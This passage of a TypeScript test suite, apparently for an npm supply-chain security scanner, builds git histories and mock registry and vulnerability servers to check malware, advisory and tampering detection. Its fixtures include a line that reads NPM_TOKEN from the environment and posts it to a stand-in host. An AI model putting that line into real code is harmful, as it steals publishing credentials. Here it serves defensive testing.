      // C1: earlier infection (non-monotonic test)
      writeFileSync(join(tmpDir, "package.json"), JSON.stringify({ name: "nm-pkg", version: "1.0.0", license: "MIT" }));
      writeFileSync(join(tmpDir, "a.js"), "export const tok = process.env.NPM_TOKEN;\n");
      writeFileSync(join(tmpDir, "b.js"), 'import { tok } from "./a.js"; fetch("https://collector.example/x", { body: tok });\n');
      git(["add", "."]);
      git(["commit", "-m", "c1 infected"]);

      // C2: cleaned commit (v1.1.0)
      writeFileSync(join(tmpDir, "package.json"), JSON.stringify({ name: "nm-pkg", version: "1.1.0", license: "MIT" }));
      writeFileSync(join(tmpDir, "a.js"), "export const tok = 'clean';\n");
      writeFileSync(join(tmpDir, "b.js"), 'import { tok } from "./a.js"; console.log(tok);\n');
      git(["add", "."]);
      git(["commit", "-m", "c2 clean"]);
      const c2 = git(["rev-parse", "HEAD"]);

      // KEV on clean HEAD C2 MUST NOT emit USE_PINNED_LATEST
      const kevHead = walkGitHistoryForCleanAnchor({
        package_name: "nm-pkg",
        repoUrlOrLocalPath: tmpDir,
        isLocalDir: true,
        policy: DEFAULT_POLICY,
        releaseTarballByCommit: new Map([[c2, { version: "1.1.0", tarball_sha512: "sha512-OK==", provenance_attested: true }]]),
        residualAdvisoriesByCommit: new Map([
          [c2, [{ id: "CVE-2026-11111", is_malicious: false, severity: "CRITICAL", kev: true, summary: "KEV RCE", package_name: "nm-pkg" }]],
        ]),
      });
      assert.equal(kevHead.recommended_action, "BLOCK_NO_SAFE_PATH");
      assert.equal(kevHead.safe_anchor?.pinned_execution.command, null);

      // C3: re-injected malware (non-monotonic history: C1 bad -> C2 clean -> C3 bad)
      writeFileSync(join(tmpDir, "a.js"), "export const tok = process.env.NPM_TOKEN;\n");
      writeFileSync(join(tmpDir, "b.js"), 'import { tok } from "./a.js"; fetch("https://collector.example/x", { body: tok });\n');
      git(["add", "."]);
      git(["commit", "-m", "c3 re-infected"]);

      const nonMono = walkGitHistoryForCleanAnchor({
        package_name: "nm-pkg",
        repoUrlOrLocalPath: tmpDir,
        isLocalDir: true,
        policy: DEFAULT_POLICY,
        releaseTarballByCommit: new Map([[c2, { version: "1.1.0", tarball_sha512: "sha512-OK==", provenance_attested: true }]]),
      });
      assert.equal(nonMono.recommended_action, "ROLLBACK_TO_SAFE_ANCHOR");
      assert.ok(nonMono.unknowns.some((u) => u.startsWith("HISTORICAL_NON_MONOTONIC_COMPROMISE")));

      // 7. Yarn Berry (@npm:) & nested package-lock.json compromise detection
      const lockDir = join(tmpDir, "locks");
      mkdirSync(lockDir, { recursive: true });
      writeFileSync(join(lockDir, "yarn.lock"), '"other@^1.0.0", "@org/bad@npm:^1.0.0":\n  version: 1.4.2\n');
      const ybHit = checkLocalWorkspaceCompromised(lockDir, "@org/bad", "MALICIOUS_INDICATORS_FOUND");
      assert.equal(ybHit?.lockfile_kind, "yarn.lock");
      assert.equal(ybHit?.matched_version, "1.4.2");

      const npmNestedDir = join(tmpDir, "npm-nested");
      mkdirSync(npmNestedDir, { recursive: true });
      writeFileSync(
        join(npmNestedDir, "package-lock.json"),
        JSON.stringify({ packages: { "node_modules/parent/node_modules/nested-bad": { version: "9.9.9" } } }),
      );
      const npmHit = checkLocalWorkspaceCompromised(npmNestedDir, "nested-bad", "MALICIOUS_INDICATORS_FOUND");
      assert.equal(npmHit?.matched_version, "9.9.9");

      // 8. Audit log extra unhashed property injection detection
      const auditPath = join(tmpDir, "audit.jsonl");
      appendAuditEvent(auditPath, { action: "inspect", target: "ok", verdict: "VERIFIED_CLEAN_WITHIN_SCOPE", policy_sha256: "p", evidence_ids: [] });
      const rawLine = JSON.parse(readFileSync(auditPath, "utf8").trim()) as Record<string, unknown>;
      rawLine["injected_approval"] = "fake-ciso-signoff";
      writeFileSync(auditPath, `${JSON.stringify(rawLine)}\n`, "utf8");
      const verifyInjected = verifyAuditLog(auditPath);
      assert.equal(verifyInjected.valid, false);
      assert.ok(verifyInjected.reason?.includes("Unexpected unhashed field"));

      // 9. auditDependencyConfusion loads .npmrc from manifest directory & handles malformed JSON cleanly
      const extProj = join(tmpDir, "ext-proj");
      mkdirSync(extProj, { recursive: true });
      writeFileSync(join(extProj, ".npmrc"), "@acme:registry=https://artifactory.acme.internal/npm\n");
      writeFileSync(join(extProj, "package.json"), JSON.stringify({ name: "ext", dependencies: { "@acme/ok": "1.0.0" } }));
      const confOk = await auditDependencyConfusion({
        cwd: tmpdir(),
        manifestPath: join(extProj, "package.json"),
        policy: { ...DEFAULT_POLICY, private_scopes: ["@acme"] },
      });
      assert.equal(confOk.passed, true);

      const badManifest = join(extProj, "bad.json");
      writeFileSync(badManifest, "{ not valid json");
      const confBad = await auditDependencyConfusion({ cwd: tmpdir(), manifestPath: badManifest, policy: DEFAULT_POLICY });
      assert.equal(confBad.passed, false);
      assert.ok(confBad.unknowns.some((u) => u.startsWith("MANIFEST_PARSE_ERROR")));
    } finally {
      rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  it("executes online CLI E2E against mocked npm registry + OSV HTTP servers (discover, inspect@ver, resolve-anchor --git-dir, boolean flag parsing)", async () => {
    const workDir = mkdtempSync(join(tmpdir(), "coldpin-e2e-http-"));
    const repoDir = join(workDir, "repo");
    const cacheDir = join(workDir, "cache");
    mkdirSync(repoDir, { recursive: true });

    const git = (a: string[]) => execFileSync("git", a, { cwd: repoDir, encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] }).trim();
    git(["init", "-b", "main"]);
    git(["config", "user.name", "Rel"]);
    git(["config", "user.email", "rel@example.com"]);

    // Commit 1 (v1.0.0 clean)
    writeFileSync(join(repoDir, "package.json"), JSON.stringify({ name: "@demo/anchored", version: "1.0.0", license: "MIT", bin: { anchored: "./cli.js" } }));
    writeFileSync(join(repoDir, "cli.js"), "console.log('v1.0.0');\n");
    git(["add", "."]);
    git(["commit", "-m", "v1.0.0"]);
    const c1 = git(["rev-parse", "HEAD"]);

    // Commit 2 (v1.1.0 clean)
    writeFileSync(join(repoDir, "package.json"), JSON.stringify({ name: "@demo/anchored", version: "1.1.0", license: "MIT", bin: { anchored: "./cli.js" } }));
    writeFileSync(join(repoDir, "cli.js"), "console.log('v1.1.0');\n");
    git(["add", "."]);
    git(["commit", "-m", "v1.1.0"]);
    const c2 = git(["rev-parse", "HEAD"]);

    // Commit 3 (v2.0.0 clean in Git, but MAL-* tarball-only compromise in OSV!)
    writeFileSync(join(repoDir, "package.json"), JSON.stringify({ name: "@demo/anchored", version: "2.0.0", license: "MIT", bin: { anchored: "./cli.js" } }));
    git(["add", "."]);
    git(["commit", "-m", "v2.0.0"]);
    const c3 = git(["rev-parse", "HEAD"]);

    // Build real fresh-cli@1.0.0 tarball
    const freshTgz = buildSyntheticTgz([
      {
        name: "package/package.json",
        content: JSON.stringify({
          name: "fresh-cli",
          version: "1.0.0",
          license: "MIT",
          bin: { fresh: "./cli.js" },
          dependencies: { "dep-vuln": "2.0.0", chalk: "^5.0.0" },
        }),
      },
      { name: "package/cli.js", content: "console.log('fresh');\n" },
    ]);
    const freshSha = computeSha512Integrity(freshTgz);
    const twoHoursAgo = new Date(Date.now() - 2 * 3600 * 1000).toISOString();
    const yearAgo = new Date(Date.now() - 365 * 24 * 3600 * 1000).toISOString();

    let blockV110WithKev = false;

    const regSrv = createServer((req, res) => {
      const url = new URL(req.url ?? "/", "http://127.0.0.1");
      const base = `http://127.0.0.1:${(regSrv.address() as AddressInfo).port}`;
      if (url.pathname === "/-/v1/search") {
        const text = url.searchParams.get("text") ?? "";
        const objects = text.includes("formatter")
          ? [
              { package: { name: "@clean-alt/formatter", version: "3.2.1", license: "MIT", description: "Clean formatter alternative", date: yearAgo } },
            ]
          : [
              { package: { name: "good-fmt", version: "1.0.0", license: "MIT", description: "Clean formatter", date: yearAgo } },
              { package: { name: "agpl-fmt", version: "1.0.0", license: "AGPL-3.0", description: "Banned license formatter", date: yearAgo } },
              { package: { name: "mal-fmt", version: "1.0.0", license: "MIT", description: "Malicious package in OSV", date: yearAgo } },
            ];
        res.writeHead(200, { "content-type": "application/json" });
        res.end(JSON.stringify({ objects }));
        return;
      }
      if (url.pathname === "/fresh-cli") {
        res.writeHead(200, { "content-type": "application/json" });
        res.end(
          JSON.stringify({
            name: "fresh-cli",
            "dist-tags": { latest: "1.0.0" },
            time: { created: twoHoursAgo, "1.0.0": twoHoursAgo },
            versions: {
              "1.0.0": {
                name: "fresh-cli",
                version: "1.0.0",
                license: "MIT",
                bin: { fresh: "./cli.js" },
                dependencies: { "dep-vuln": "2.0.0", chalk: "^5.0.0" },
                dist: { tarball: `${base}/tarballs/fresh-cli-1.0.0.tgz`, integrity: freshSha, attestations: { url: `${base}/att` } },
              },
            },
          }),
        );
        return;
      }
      if (url.pathname === "/tarballs/fresh-cli-1.0.0.tgz") {
        res.writeHead(200, { "content-type": "application/octet-stream", "content-length": String(freshTgz.length) });
        res.end(freshTgz);
        return;
      }
      if (url.pathname === "/@demo%2Fanchored") {
        res.writeHead(200, { "content-type": "application/json" });
        res.end(
          JSON.stringify({
            name: "@demo/anchored",
            "dist-tags": { latest: "2.0.0" },
            keywords: ["formatter"],
            time: { created: yearAgo, "1.0.0": yearAgo, "1.1.0": yearAgo, "2.0.0": yearAgo },
            versions: {
              ...(blockV110WithKev
                ? {}
                : {
                    "1.0.0": {
                      name: "@demo/anchored",
                      version: "1.0.0",
                      gitHead: c1,
                      dist: { tarball: `${base}/t1.tgz`, integrity: "sha512-V100==" },
                    },
                  }),
              "1.1.0": {
                name: "@demo/anchored",
                version: "1.1.0",
                gitHead: c2,
                bin: { anchored: "./cli.js" },
                dist: { tarball: `${base}/t11.tgz`, integrity: "sha512-V110==" },
              },
              "2.0.0": {
                name: "@demo/anchored",
                version: "2.0.0",
                gitHead: c3,
                bin: { anchored: "./cli.js" },
                keywords: ["formatter"],
                dist: { tarball: `${base}/t20.tgz`, integrity: "sha512-V200==" },
              },
            },
          }),
        );
        return;
      }
      res.writeHead(404);
      res.end();
    });

    const osvSrv = createServer(async (req, res) => {
      const url = new URL(req.url ?? "/", "http://127.0.0.1");
      if (req.method === "POST" && url.pathname === "/v1/querybatch") {
        const chunks: Buffer[] = [];
        for await (const ch of req) chunks.push(Buffer.from(ch));
        const body = JSON.parse(Buffer.concat(chunks).toString("utf8")) as {
          queries: Array<{ package: { name: string }; version?: string }>;
        };
        const results = body.queries.map((q) => {
          if (q.package.name === "mal-fmt") return { vulns: [{ id: "MAL-2026-9999" }] };
          if (q.package.name === "dep-vuln" && q.version === "2.0.0") return { vulns: [{ id: "GHSA-kev-2000" }] };
          if (q.package.name === "@demo/anchored" && q.version === "2.0.0") return { vulns: [{ id: "MAL-2026-8888" }] };
          if (blockV110WithKev && q.package.name === "@demo/anchored" && q.version === "1.1.0") {
            return { vulns: [{ id: "GHSA-kev-1100" }] };
          }
          return { vulns: [] };
        });
        res.writeHead(200, { "content-type": "application/json" });
        res.end(JSON.stringify({ results }));
        return;
      }
      if (url.pathname.startsWith("/v1/vulns/")) {
        const vid = decodeURIComponent(url.pathname.slice("/v1/vulns/".length));
        const isKev = vid.includes("kev");
        res.writeHead(200, { "content-type": "application/json" });
        res.end(
          JSON.stringify({
            id: vid,
            summary: isKev ? "Known exploited critical bug" : "OpenSSF Malicious Package",
            database_specific: { severity: "CRITICAL", cisa_kev: isKev },
          }),
        );
        return;
      }
      res.writeHead(404);
      res.end();
    });

    await new Promise<void>((r) => regSrv.listen(0, "127.0.0.1", () => r()));
    await new Promise<void>((r) => osvSrv.listen(0, "127.0.0.1", () => r()));
    const regPort = (regSrv.address() as AddressInfo).port;
    const osvPort = (osvSrv.address() as AddressInfo).port;

    const policyPath = join(workDir, "policy.json");
    writeFileSync(
      policyPath,
      JSON.stringify({
        default_registry: `http://127.0.0.1:${regPort}`,
        osv_api_url: `http://127.0.0.1:${osvPort}`,
      }),
    );

    const cliPath = resolve("src/cli.ts");
    const runCli = (args: string[]) =>
      new Promise<{ code: number; stdout: string; stderr: string }>((res) => {
        const p = spawn(process.execPath, ["--no-warnings", cliPath, ...args]);
        let stdout = "";
        let stderr = "";
        p.stdout.on("data", (d) => (stdout += String(d)));
        p.stderr.on("data", (d) => (stderr += String(d)));
        p.on("close", (code) => res({ code: code ?? 1, stdout, stderr }));
      });

    try {
      // A. Online discover with boolean flag `--json` BEFORE positional query + license blocking + OSV MAL-* flagging
      const disc = await runCli(["discover", "--json", "fmt", "--policy", policyPath, "--cache-dir", cacheDir]);
      assert.equal(disc.code, 0, disc.stderr);
      const discJson = JSON.parse(disc.stdout) as {
        candidates: Array<{ package_name: string; verdict_preview: string }>;
        blocked_candidates: Array<{ package_name: string; reason: string }>;
      };
      assert.ok(discJson.blocked_candidates.some((b) => b.package_name === "agpl-fmt" && b.reason.includes("AGPL-3.0")));
      assert.equal(
        discJson.candidates.find((c) => c.package_name === "mal-fmt")?.verdict_preview,
        "MALICIOUS_INDICATORS_FOUND",
      );
      assert.ok(discJson.candidates.some((c) => c.package_name === "good-fmt"));

      // B. Online inspect <pkg>@<ver> with boolean `--json` BEFORE target -> cooldown + direct dep KEV + floating dep warning
      const insp = await runCli(["inspect", "--json", "fresh-cli@1.0.0", "--policy", policyPath, "--cache-dir", cacheDir]);
      assert.equal(insp.code, 2, insp.stderr); // QUARANTINE_SUSPICIOUS (cooldown + KEV)
      const inspJson = JSON.parse(insp.stdout) as {
        verdict: string;
        evidence: Array<{ source: string; observations: Array<{ code: string }>; unknowns: string[]; coverage: { transitive_checked: boolean } }>;
      };
      assert.equal(inspJson.verdict, "QUARANTINE_SUSPICIOUS");
      const t0 = inspJson.evidence.find((e) => e.source === "tier0_intel")!;
      assert.ok(t0.observations.some((o) => o.code === "RELEASE_COOLDOWN_QUARANTINE"), "explicit @ver must still enforce cooldown");
      assert.ok(t0.observations.some((o) => o.code === "POLICY_CISA_KEV_BLOCK"), "direct dep KEV must fire");
      assert.equal(t0.coverage.transitive_checked, false);
      assert.ok(t0.unknowns.some((u) => u.startsWith("TRANSITIVE_FLOATING_RANGES_UNRESOLVED")));

      // Verify CycloneDX VEX attributes dep-vuln advisory to dep-vuln bom-ref (not root fresh-cli)
      const sbomRun = await runCli(["inspect", "--sbom", "fresh-cli@1.0.0", "--policy", policyPath, "--cache-dir", cacheDir]);
      const sbomJson = JSON.parse(sbomRun.stdout) as { vulnerabilities: Array<{ id: string; affects: Array<{ ref: string }> }> };
      assert.equal(sbomJson.vulnerabilities[0]?.affects[0]?.ref, "pkg:npm/dep-vuln@2.0.0");

      // C1. Online resolve-anchor <pkg> --git-dir <repo> -> MUST query packument + OSV MAL-* on v2.0.0 & roll back to v1.1.0!
      const anch1 = await runCli([
        "resolve-anchor",
        "--json",
        "@demo/anchored",
        "--git-dir",
        repoDir,
        "--policy",
        policyPath,
        "--cache-dir",
        cacheDir,
      ]);
      assert.equal(anch1.code, 0, anch1.stderr);
      const anch1Json = JSON.parse(anch1.stdout) as {
        recommended_action: string;
        safe_anchor?: { version?: string; commit_sha?: string; pinned_execution: { command: string | null } };
      };
      assert.equal(anch1Json.recommended_action, "ROLLBACK_TO_SAFE_ANCHOR");
      assert.equal(anch1Json.safe_anchor?.version, "1.1.0");
      assert.equal(anch1Json.safe_anchor?.commit_sha, c2);
      assert.ok(anch1Json.safe_anchor?.pinned_execution.command?.includes("@demo/anchored@1.1.0 -- anchored"));

      // C2. When v1.1.0 ALSO has a CISA KEV (and v1.0.0 unmapped), auto-discovers clean alternative outside @demo!
      blockV110WithKev = true;
      const cacheDir2 = join(workDir, "cache2");
      const anch2 = await runCli([
        "resolve-anchor",
        "--json",
        "@demo/anchored",
        "--git-dir",
        repoDir,
        "--policy",
        policyPath,
        "--cache-dir",
        cacheDir2,
      ]);
      assert.equal(anch2.code, 2, anch2.stderr); // SWITCH_TO_ALTERNATIVE
      const anch2Json = JSON.parse(anch2.stdout) as {
        recommended_action: string;
        alternatives: Array<{ package_name: string }>;
      };
      assert.equal(anch2Json.recommended_action, "SWITCH_TO_ALTERNATIVE");
      assert.ok(anch2Json.alternatives.some((a) => a.package_name === "@clean-alt/formatter"));

      // D. Unknown CLI flag & invalid --limit must exit 1 cleanly
      const badFlag = await runCli(["inspect", "--bogus-flag", "prettier"]);
      assert.equal(badFlag.code, 1);
      const badLimit = await runCli(["discover", "fmt", "--limit", "abc"]);
      assert.equal(badLimit.code, 1);
    } finally {
      regSrv.close();
      osvSrv.close();
      rmSync(workDir, { recursive: true, force: true });
    }
  });
});
